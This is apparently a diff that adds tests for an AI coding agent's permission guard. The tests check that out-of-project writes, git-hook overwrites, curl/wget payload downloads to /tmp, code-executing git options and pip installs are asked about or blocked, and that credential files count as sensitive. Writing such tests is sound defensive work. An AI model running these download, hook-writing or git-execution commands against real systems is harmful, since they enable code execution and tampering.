@@ -403,6 +403,260 @@ await test("writes to in-project execution paths need confirmation, YOLO refuses
   );
 });
 
+await test("runtime path aliases stay outside the project permission scope", async () => {
+  if (!permissionPolicy || !modePermissions || !planMode) return;
+  const cwd = mkdtempSync(join(tmpdir(), "pi-runtime-path-alias-"));
+  try {
+    for (const path of ["@/tmp/x", "~/x", "@~/x", "./a/../../x"]) {
+      eq(
+        permissionPolicy.decideFileAccess("project-write", "write", path, cwd)
+          .action,
+        "block",
+        `${path} resolves outside the project and remains hard-blocked`,
+      );
+      eq(
+        permissionPolicy.resolvePathScope(path, cwd).scope,
+        "external",
+        `${path} has an external resolved identity`,
+      );
+    }
+    eq(
+      permissionPolicy.resolvePathScope("@docs/readme.md", cwd).lexicalPath,
+      join(cwd, "docs", "readme.md"),
+      "@ on a relative project path is stripped like the runtime does",
+    );
+
+    const harness = createHarness({ confirm: false, customResult: false });
+    harness.api.events.on("recovery-status:request", (request) =>
+      request.respond({ armed: false }),
+    );
+    planMode.default(harness.api);
+    modePermissions.default(harness.api);
+    const context = harness.makeContext({ cwd, mode: "tui" });
+    await harness.runHooks("session_start", {}, context);
+    await harness.commands.get("permission")("project-write", context);
+    const externalInput = { path: "@/tmp/x", content: "blocked" };
+    const externalResult = await harness.runHooks(
+      "tool_call",
+      { toolName: "write", input: externalInput },
+      context,
+    );
+    assert(
+      externalResult.some((result) => result?.block),
+      "tool_call blocks the runtime's @-prefixed external write",
+    );
+
+    const internalInput = {
+      path: "@docs/readme.md",
+      content: "allowed project path",
+    };
+    const internalResult = await harness.runHooks(
+      "tool_call",
+      { toolName: "write", input: internalInput },
+      context,
+    );
+    assert(
+      internalResult.every((result) => !result?.block),
+      "tool_call keeps a runtime @-prefixed project path allowed",
+    );
+    await harness.runHooks("session_shutdown", {}, context);
+  } finally {
+    rmSync(cwd, { recursive: true, force: true });
+  }
+});
+
+await test("Bash hard-blocks shell writes to protected execution paths", () => {
+  if (!permissionPolicy) return;
+  const cwd = process.cwd();
+  const decide = (level, command) =>
+    permissionPolicy.decideBash(level, command, cwd).action;
+  for (const command of [
+    "echo x > .git/hooks/pre-commit",
+    "echo {} > .pi/verify.json",
+  ]) {
+    eq(decide("project-write", command), "ask", `${command} asks`);
+    eq(decide("headless", command), "block", `${command} blocks headless`);
+    eq(decide("yolo", command), "block", `${command} blocks YOLO`);
+  }
+  eq(
+    decide("project-write", "echo x > src/a.ts"),
+    "allow",
+    "an ordinary project redirection remains allowed",
+  );
+  eq(
+    decide("project-write", "cat .git/config"),
+    "allow",
+    "reading .git/config remains allowed",
+  );
+  eq(
+    decide("project-write", "git status"),
+    "allow",
+    "git status remains allowed",
+  );
+});
+
+await test("curl and wget output paths use the external-write boundary", () => {
+  if (!permissionPolicy) return;
+  const cwd = process.cwd();
+  for (const [command, output] of [
+    ["curl -s https://example.test/payload -o /tmp/payload", "/tmp/payload"],
+    ["wget -O /tmp/evil https://example.test/payload", "/tmp/evil"],
+  ]) {
+    eq(
+      permissionPolicy.decideBash("project-write", command, cwd).action,
+      "ask",
+      `${command} requires confirmation for ${output}`,
+    );
+    eq(
+      permissionPolicy.decideBash("headless", command, cwd).action,
+      "block",
+      `${command} blocks without a confirmation channel`,
+    );
+    eq(
+      permissionPolicy.decideBash("yolo", command, cwd).action,
+      "block",
+      `${command} respects the YOLO project boundary`,
+    );
+  }
+  eq(
+    permissionPolicy.decideBash(
+      "project-write",
+      "curl -s https://example.test/data | jq .",
+      cwd,
+    ).action,
+    "allow",
+    "curl to stdout remains allowed",
+  );
+  eq(
+    permissionPolicy.decideBash(
+      "project-write",
+      "curl -s https://example.test/payload -o dist/x.js",
+      cwd,
+    ).action,
+    "allow",
+    "curl output inside the project remains allowed",
+  );
+});
+
+await test("git execution configuration is risky, ordinary global options stay safe", () => {
+  if (!permissionPolicy) return;
+  const cwd = process.cwd();
+  for (const command of [
+    "git -c core.fsmonitor=cmd status",
+    "git --config-env=core.fsmonitor=ENV status",
+    "git --exec-path=/tmp status",
+  ]) {
+    eq(
+      permissionPolicy.classifyOperationEffect(command, cwd),
+      "RISKY",
+      `${command} cannot be classified safe`,
+    );
+  }
+  eq(
+    permissionPolicy.classifyOperationEffect("git -C sub status", cwd),
+    "SAFE",
+    "-C remains an ordinary safe path option",
+  );
+  eq(
+    permissionPolicy.classifyOperationEffect("git --no-pager log", cwd),
+    "SAFE",
+    "--no-pager remains an ordinary safe option",
+  );
+});
+
+await test("Python modules ask unless they are on the developer-tool allowlist", () => {
+  if (!permissionPolicy) return;
+  const cwd = process.cwd();
+  eq(
+    permissionPolicy.decideBash("project-write", "python3 -m http.server", cwd)
+      .action,
+    "ask",
+    "an arbitrary standard-library module needs confirmation",
+  );
+  eq(
+    permissionPolicy.decideBash(
+      "project-write",
+      "python3 -m json.tool package.json",
+      cwd,
+    ).action,
+    "allow",
+    "an allowlisted read-only developer module stays usable",
+  );
+  eq(
+    permissionPolicy.decideBash(
+      "project-write",
+      "python3 -m pip install evil",
+      cwd,
+    ).action,
+    "ask",
+    "Python package installation still needs confirmation",
+  );
+});
+
+await test("credential path additions preserve ordinary config and env examples", () => {
+  if (!permissionPolicy) return;
+  for (const path of [
+    ".git-credentials",
+    ".kube/config",
+    ".docker/config.json",
+    ".config/gh/hosts.yml",
+  ]) {
+    assert(
+      permissionPolicy.isSensitiveReference(path),
+      `${path} is recognized as sensitive`,
+    );
+  }
+  assert(
+    !permissionPolicy.isSensitiveReference(".git/config"),
+    ".git/config remains an ordinary readable config file",
+  );
+  assert(
+    !permissionPolicy.isSensitiveReference(".env.example"),
+    ".env.example remains outside the credential boundary",
+  );
+});
+
+await test("RPC UI contexts receive guard blocks without terminating the run", async () => {
+  if (!modePermissions || !planMode) return;
+  const invokeBlockedWrite = async (hasUI) => {
+    const harness = createHarness({ confirm: false, customResult: false });
+    harness.api.events.on("recovery-status:request", (request) =>
+      request.respond({ armed: false }),
+    );
+    planMode.default(harness.api);
+    modePermissions.default(harness.api);
+    const context = harness.makeContext({
+      cwd: process.cwd(),
+      mode: "rpc",
+      hasUI,
+      trusted: false,
+    });
+    await harness.runHooks("session_start", {}, context);
+    const results = await harness.runHooks(
+      "tool_call",
+      { toolName: "write", input: { path: "blocked.txt", content: "x" } },
+      context,
+    );
+    await harness.runHooks("session_shutdown", {}, context);
+    return results.find((result) => result?.block);
+  };
+
+  const uiBlock = await invokeBlockedWrite(true);
+  assert(uiBlock, "a normal trust guard block is returned in RPC with UI");
+  eq(
+    uiBlock.terminate,
+    undefined,
+    "the RPC UI channel keeps the run alive after a normal block",
+  );
+  const headlessBlock = await invokeBlockedWrite(false);
+  assert(headlessBlock, "the same trust guard blocks in RPC without UI");
+  eq(
+    headlessBlock.terminate,
+    true,
+    "an RPC block without UI still terminates the impossible retry loop",
+  );
+});
+
 await test("resolvePathScope flags a symlink only when its real target escapes the project", () => {
   if (!permissionPolicy) return;
   const cwd = mkdtempSync(join(tmpdir(), "pi-symlink-scope-"));
@@ -2105,6 +2359,14 @@ await test("git commit is detected across shell connectors, other commands are n
     "git --git-dir=/tmp/repo/.git commit -m x",
     "git --work-tree=/tmp/repo --no-pager commit -m x",
     "git -C /repo -c user.name=test --no-pager commit -m x",
+    'git -c user.name="Max Mustermann" commit -m x',
+    "/nix/store/s89df7s98d7f-git-2.42.0/bin/git commit -m x",
+    "/run/current-system/sw/bin/git commit -m x",
+    "command git commit -m x",
+    "git --exec-path /x commit -m x",
+    "sudo git commit -m x",
+    "exec git commit -m x",
+    "cd repo && git commit -am x",
   ]) {
     assert(
       touches(command),
@@ -2113,10 +2375,13 @@ await test("git commit is detected across shell connectors, other commands are n
   }
   for (const command of [
     'echo "git commit"',
+    "echo 'git commit' > note.txt",
     "printf '%s' 'git commit'",
     "# git commit",
-    "command git commit -m x",
     "sh -c 'git commit -m x'",
+    "git status",
+    "git log --grep=commit",
+    'grep -r "git commit" docs',
   ]) {
     assert(
       !touches(command),
@@ -2313,11 +2578,24 @@ await test("git commit gate blocks outside Git while filesystem snapshots remain
       );
     assert(
       !(await assess("write", 'git commit -m "x"')).blocked,
-      "only bash calls are in scope, regardless of what the input contains",
+      "only shell calls are in scope, regardless of what the input contains",
     );
     assert(
       !(await assess("bash", "git status")).blocked,
       "a non-commit bash call never reaches snapshot collection",
+    );
+    assert(
+      !(await assess("interactive_shell", "git status")).blocked,
+      "a non-commit interactive_shell call never reaches snapshot collection",
+    );
+    const blockedInteractive = await assess(
+      "interactive_shell",
+      'git commit -m "x"',
+    );
+    assert(
+      blockedInteractive.blocked &&
+        blockedInteractive.reason.includes("VCS: none"),
+      "interactive_shell git commit is checked and blocks outside a repository",
     );
     const blocked = await assess("bash", 'git commit -m "x"');
     assert(
